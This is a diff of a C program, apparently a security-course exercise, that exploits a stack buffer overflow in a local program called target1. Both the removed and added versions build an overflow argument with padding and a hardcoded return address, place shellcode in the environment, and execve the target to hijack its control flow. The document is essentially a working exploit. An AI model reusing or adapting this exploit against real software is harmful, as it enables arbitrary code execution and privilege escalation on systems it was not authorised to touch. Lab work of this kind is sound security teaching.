@@ -5,22 +5,30 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target1"
+#define TARGET "/srv/target1"
 
-int main(void)
-{
-  char *args[3]; 
-  char *env[1];
+int main(void) {
+    char *args[3];
+    char *env[2];
 
-  args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9f\xff\xff\xbf";
-  // (gdb) x/x *(char**)environ
-  // 0xbfffff9f:	0xdb31c031
-  args[2] = NULL;
-  
-  env[0] = shellcode;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    char padding[12];
+    memset(padding, 'A', 12);
 
-  return 0;
+    char *malicious_buffer = (char *)malloc(12 + 4);
+    memcpy(malicious_buffer, padding, 12);
+    *(unsigned int *)(malicious_buffer + 12) = 0xffffd721;
+
+    char shellcode_env[sizeof(shellcode) + 8];
+    sprintf(shellcode_env, "SHELL=%s", shellcode);
+
+    args[0] = TARGET;
+    args[1] = malicious_buffer;
+    args[2] = NULL;
+
+    env[0] = shellcode_env;
+    env[1] = NULL;
+
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+    return 0;
 }
